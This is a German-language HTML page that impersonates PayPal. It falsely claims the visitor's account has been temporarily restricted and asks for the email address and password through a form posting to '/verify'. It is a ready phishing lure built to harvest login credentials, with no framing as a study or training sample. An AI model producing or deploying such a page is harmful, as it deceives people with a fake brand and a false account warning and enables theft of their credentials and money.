<!doctype html>
<html lang="de">
<head><meta charset="utf-8"><title>PayPal - Konto bestätigen</title></head>
<body>
  <h1>PayPal</h1>
  <p>Ihr Konto wurde vorübergehend eingeschränkt. Bitte bestätigen Sie Ihre Daten.</p>
  <form method="post" action="/verify">
    <label for="email">E-Mail</label>
    <input id="email" name="email" type="text">
    <label for="passwort">Passwort</label>
    <input id="passwort" name="passwort" type="password">
    <button type="submit">Konto bestätigen</button>
  </form>
</body>
</html>
